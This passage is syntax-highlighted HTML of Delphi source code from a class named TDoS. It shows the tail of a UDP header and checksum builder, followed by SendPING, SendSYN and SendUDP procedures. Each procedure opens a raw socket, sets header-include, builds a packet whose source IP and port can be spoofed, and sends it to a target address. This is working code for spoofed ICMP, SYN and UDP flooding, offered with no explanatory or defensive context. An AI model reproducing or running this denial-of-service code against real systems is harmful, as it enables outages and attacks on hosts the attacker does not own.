  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">udpHdr.uh_sport</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">FromPort</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">udpHdr.uh_dport</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">ToPort</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">udpHdr.uh_len</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">udpHdr.uh_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_saddr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">SizeOf</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_daddr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Inc</span><span class="sc10">(</span><span class="sc11">ChecksumSize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr.ip_protocol</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">udpHdr.uh_len</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr.uh_len</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr.uh_len</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr.uh_len</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">CheckSumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">Length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">udpHdr.uh_checksum</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Checksum</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ChecksumSize</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">FillChar</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Buffer</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">DataPointer</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> @</span><span class="sc11">Buffer</span><span class="sc10">[</span><span class="sc4">0</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">ipHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">IncPtr</span><span class="sc10">(</span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">udpHdr</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Move</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">[</span><span class="sc4">1</span><span class="sc10">],</span><span class="sc0"> </span><span class="sc11">DataPointer</span><span class="sc10">^,</span><span class="sc0"> </span><span class="sc11">length</span><span class="sc10">(</span><span class="sc11">Data</span><span class="sc10">));</span><span class="sc0">
  </span><span class="sc11">Socket.sin_family</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Socket.sin_port</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">htons</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc11">Socket.sin_addr.saddr</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">inet_addr</span><span class="sc10">(</span><span class="sc11">pchar</span><span class="sc10">(</span><span class="sc11">ToIP</span><span class="sc10">));</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">TDoS.SendPING</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">sh</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">op</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Sck</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">wsdata</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TWSAdata</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc4">$0002</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wsdata</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">try</span><span class="sc0">
    </span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">op</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">SetSockOpt</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> @</span><span class="sc11">op</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">op</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PNGHeader</span><span class="sc10">(</span><span class="sc11">SourceIP</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TargetIP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SendTo</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Sck</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseSocket</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">finally</span><span class="sc0">
    </span><span class="sc11">WSACleanup</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">TDoS.SendSYN</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourcePort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">sh</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">op</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Sck</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">Word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">wsdata</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TWSAdata</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc4">$0002</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wsdata</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">try</span><span class="sc0">
    </span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">op</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">SetSockOpt</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> @</span><span class="sc11">op</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">op</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">SYNHeader</span><span class="sc10">(</span><span class="sc11">SourceIP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SourcePort</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TargetIP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SendTo</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Sck</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseSocket</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">finally</span><span class="sc0">
    </span><span class="sc11">WSACleanup</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">procedure</span><span class="sc0"> </span><span class="sc11">TDoS.SendUDP</span><span class="sc10">(</span><span class="sc11">TargetIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourceIP</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">SourcePort</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc5">string</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc5">var</span><span class="sc0">
  </span><span class="sc11">sh</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">op</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">integer</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Buffer</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TBufferArray</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Sck</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TSockAddr</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">Size</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">word</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">wsdata</span><span class="sc10">:</span><span class="sc0"> </span><span class="sc11">TWSAdata</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">begin</span><span class="sc0">
  </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">WSAStartup</span><span class="sc10">(</span><span class="sc4">$0002</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wsdata</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">&lt;&gt;</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">try</span><span class="sc0">
    </span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">Socket</span><span class="sc10">(</span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">INVALID_SOCKET</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">op</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">:=</span><span class="sc0"> </span><span class="sc11">SetSockOpt</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> @</span><span class="sc11">op</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">op</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc11">rt</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc0"> </span><span class="sc5">then</span><span class="sc0"> </span><span class="sc5">exit</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">UDPHeader</span><span class="sc10">(</span><span class="sc11">SourceIP</span><span class="sc10">,</span><span class="sc0">  </span><span class="sc11">SourcePort</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TargetIP</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">TargetPort</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Data</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">SendTo</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Buffer</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">Sck</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">sizeof</span><span class="sc10">(</span><span class="sc11">Sck</span><span class="sc10">));</span><span class="sc0">
    </span><span class="sc11">CloseSocket</span><span class="sc10">(</span><span class="sc11">sh</span><span class="sc10">);</span><span class="sc0">
  </span><span class="sc5">finally</span><span class="sc0">
    </span><span class="sc11">WSACleanup</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc5">end</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc5">end.</span><span class="sc0">

</span></div></body>
</html>
